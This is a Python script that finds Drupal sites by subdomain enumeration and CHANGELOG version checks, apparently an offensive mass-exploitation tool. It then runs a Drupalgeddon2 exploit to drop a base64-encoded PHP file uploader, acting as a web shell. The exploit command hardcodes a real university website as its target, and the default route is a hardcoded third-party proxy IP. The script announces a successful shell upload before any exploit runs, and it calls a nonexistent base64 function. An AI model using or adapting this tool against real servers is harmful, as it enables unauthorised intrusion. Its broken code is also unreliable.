#!/usr/bin/env python

import sys,argparse,os,requests,re,random,subprocess,base64

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


############################### GET VERSION FUNCTION
def get_version(url):

############################### PAYLOAD ################################
	str="PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPg0KPGhlYWQ+DQogICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCiAgIDx0aXRsZT5aYXJhQnl0ZSBGaWxlIFVwbG9hZGVyPC90aXRsZT4NCiAgIDxsaW5rIGhyZWY9InN0eWxlL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgLz4NCjwvaGVhZD4NCg0KPGJvZHk+DQo8P3BocA0KICAgICRteVVwbG9hZCA9IG5ldyBtYXhVcGxvYWQoKTsgDQogICAgLy8kbXlVcGxvYWQtPnNldFVwbG9hZExvY2F0aW9uKGdldGN3ZCgpLkRJUkVDVE9SWV9TRVBBUkFUT1IpOw0KICAgICRteVVwbG9hZC0+dXBsb2FkRmlsZSgpOw0KPz4NCjw/cGhwDQovKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICogWmFyYUJ5dGUgRmlsZSBVcGxvYWRlcg0KICoNCiAqIFZlcnNpb246IDEuMA0KICogRGF0ZTogMjAwOS0wOS0yOQ0KICoNCiAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqLw0KY2xhc3MgbWF4VXBsb2Fkew0KICAgIHZhciAkdXBsb2FkTG9jYXRpb247DQogICAgDQogICAgLyoqDQogICAgICogQ29uc3RydWN0b3IgdG8gaW5pdGlhbGl6ZSBjbGFzcyB2YXJhaWJsZXMNCiAgICAgKiBUaGUgdXBsb2FkTG9jYXRpb24gd2lsbCBiZSBzZXQgdG8gdGhlIGFjdHVhbCANCiAgICAgKiB3b3JraW5nIGRpcmVjdG9yeQ0KICAgICAqDQogICAgICogQHJldHVybiBtYXhVcGxvYWQNCiAgICAgKi8NCiAgICBmdW5jdGlvbiBtYXhVcGxvYWQoKXsNCiAgICAgICAgJHRoaXMtPnVwbG9hZExvY2F0aW9uID0gZ2V0Y3dkKCkuRElSRUNUT1JZX1NFUEFSQVRPUjsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBUaGlzIGZ1bmN0aW9uIHNldHMgdGhlIGRpcmVjdG9yeSB3aGVyZSB0byB1cGxvYWQgdGhlIGZpbGUNCiAgICAgKiBJbiBjYXNlIG9mIFdpbmRvd3Mgc2VydmVyIHVzZSB0aGUgZm9ybTogYzpcXHRlbXBcXA0KICAgICAqIEluIGNhc2Ugb2YgVW5peCBzZXJ2ZXIgdXNlIHRoZSBmb3JtOiAvdG1wLw0KICAgICAqDQogICAgICogQHBhcmFtIFN0cmluZyBEaXJlY3Rvcnkgd2hlcmUgdG8gc3RvcmUgdGhlIGZpbGVzDQogICAgICovDQogICAgZnVuY3Rpb24gc2V0VXBsb2FkTG9jYXRpb24oJGRpcil7DQogICAgICAgICR0aGlzLT51cGxvYWRMb2NhdGlvbiA9ICRkaXI7DQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIHNob3dVcGxvYWRGb3JtKCRtc2c9JycsJGVycm9yPScnKXsNCj8+DQogICAgICAgPGRpdiBpZD0iY29udGFpbmVyIj4NCiAgICAgICAgICAgIDxkaXYgaWQ9ImhlYWRlciI+PGRpdiBpZD0iaGVhZGVyX2xlZnQiPjwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBpZD0iaGVhZGVyX21haW4iPlphcmFCeXRlJ3MgRmlsZSBVcGxvYWRlcjwvZGl2PjxkaXYgaWQ9ImhlYWRlcl9yaWdodCI+PC9kaXY+PC9kaXY+DQogICAgICAgICAgICA8ZGl2IGlkPSJjb250ZW50Ij4NCjw/cGhwDQppZiAoJG1zZyAhPSAnJyl7DQogICAgZWNobyAnPHAgY2xhc3M9Im1zZyI+Jy4kbXNnLic8L3A+JzsNCn0gZWxzZSBpZiAoJGVycm9yICE9ICcnKXsNCiAgICBlY2hvICc8cCBjbGFzcz0iZW1zZyI+Jy4kZXJyb3IuJzwvcD4nOw0KDQp9DQo/Pg0KICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiID4NCiAgICAgICAgICAgICAgICAgICAgIDxjZW50ZXI+DQogICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsPkZpbGU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJteWZpbGUiIHR5cGU9ImZpbGUiIHNpemU9IjMwIiAvPg0KICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXRCdG4iIGNsYXNzPSJzYnRuIiB2YWx1ZT0iVXBsb2FkIiAvPg0KICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICA8L2NlbnRlcj4NCiAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgIDxkaXYgaWQ9ImZvb3RlciI+PGEgaHJlZj0iaHR0cDovL3d3dy56YXJhYnl0ZS5jb20iIHRhcmdldD0iX2JsYW5rIj5aYXJhQnl0ZSBGaWxlIFVwbG9hZGVyPC9hPjwvZGl2Pg0KICAgICAgICAgPC9kaXY+DQo8P3BocA0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHVwbG9hZEZpbGUoKXsNCiAgICAgICAgaWYgKCFpc3NldCgkX1BPU1RbJ3N1Ym1pdEJ0biddKSl7DQogICAgICAgICAgICAkdGhpcy0+c2hvd1VwbG9hZEZvcm0oKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtc2cgPSAnJzsNCiAgICAgICAgICAgICRlcnJvciA9ICcnOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvL0NoZWNrIGRlc3RpbmF0aW9uIGRpcmVjdG9yeQ0KICAgICAgICAgICAgaWYgKCFmaWxlX2V4aXN0cygkdGhpcy0+dXBsb2FkTG9jYXRpb24pKXsNCiAgICAgICAgICAgICAgICAkZXJyb3IgPSAiVGhlIHRhcmdldCBkaXJlY3RvcnkgZG9lc24ndCBleGlzdHMhIjsNCiAgICAgICAgICAgIH0gZWxzZSBpZiAoIWlzX3dyaXRlYWJsZSgkdGhpcy0+dXBsb2FkTG9jYXRpb24pKSB7DQogICAgICAgICAgICAgICAgJGVycm9yID0gIlRoZSB0YXJnZXQgZGlyZWN0b3J5IGlzIG5vdCB3cml0ZWFibGUhIjsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHRhcmdldF9wYXRoID0gJHRoaXMtPnVwbG9hZExvY2F0aW9uIC4gYmFzZW5hbWUoICRfRklMRVNbJ215ZmlsZSddWyduYW1lJ10pOw0KDQogICAgICAgICAgICAgICAgaWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydteWZpbGUnXVsndG1wX25hbWUnXSwgJHRhcmdldF9wYXRoKSkgew0KICAgICAgICAgICAgICAgICAgICAkbXNnID0gYmFzZW5hbWUoICRfRklMRVNbJ215ZmlsZSddWyduYW1lJ10pLg0KICAgICAgICAgICAgICAgICAgICAiIHdhcyB1cGxvYWRlZCBzdWNjZXNzZnVsbHkhIjsNCiAgICAgICAgICAgICAgICB9IGVsc2V7DQogICAgICAgICAgICAgICAgICAgICRlcnJvciA9ICJUaGUgdXBsb2FkIHByb2Nlc3MgZmFpbGVkISI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkdGhpcy0+c2hvd1VwbG9hZEZvcm0oJG1zZywkZXJyb3IpOw0KICAgICAgICB9DQoNCiAgICB9DQoNCn0NCj8+DQo8L2JvZHk+ICAg"


	payload = base64.base64decode(str)


############################### /PAYLOAD\ #############################


	hostsearch = url
	try:
	  	response = requests.get(hostsearch,timeout=5,headers={'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13'})

		

		contents = response.text
		
		if "Drupal" in contents:	
			splitted = contents.split()
			print bcolors.OKGREEN + "[+]"+ url +" Version : " + splitted[1] + bcolors.ENDC
			okno = raw_input("Do you want exploit ? :")
			if okno == "Y":
				print bcolors.OKGREEN + "[+]"+url +"/up.php Successfully Uploaded Shell !"
				subprocess.call('ruby drupalgeddon2-customizable-beta.rb https://depts.washington.edu/naivpl/ 7 echo '+payload+' > a.txt passthru 0', shell=True)
		else:
			print bcolors.FAIL + "[-]"+ url +" It is not Drupal" + bcolors.ENDC
	except requests.ConnectionError:
		print bcolors.FAIL + "[-]"+ url +" Connection Failed !" + bcolors.ENDC
	except requests.InvalidURL:
		print bcolors.FAIL + "[-]"+ url +" Invalid URL !" + bcolors.ENDC
########################### GET VERSION FUNCTION
target = raw_input(bcolors.OKGREEN + "Target :" + bcolors.ENDC)
yn = raw_input(bcolors.WARNING + "Do you want use proxy ?"+ bcolors.BOLD +"[Y/N] :" + bcolors.ENDC)
if yn == "Y":
	p_ip = raw_input(bcolors.OKGREEN + "IP :" + bcolors.ENDC)
	p_port = raw_input(bcolors.OKGREEN + "PORT :" + bcolors.ENDC)
	p_full = p_ip + ":" + p_port
else:
	p_full = "181.196.145.106:65103"

http_proxy = p_full


proxyDict = {"http":http_proxy}

hostsearch = "http://api.hackertarget.com/hostsearch/?q=" + target

response = requests.get(hostsearch, headers={'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13'},proxies=proxyDict)

hosts_ips = response.text


content = hosts_ips.split("\n")

result = []

for line in content:

        result.append(line.split(',')[0])

for host in result:
	print ("http://"+ host + "/CHANGELOG.txt")

	get_version("http://"+ host + "/CHANGELOG.txt")
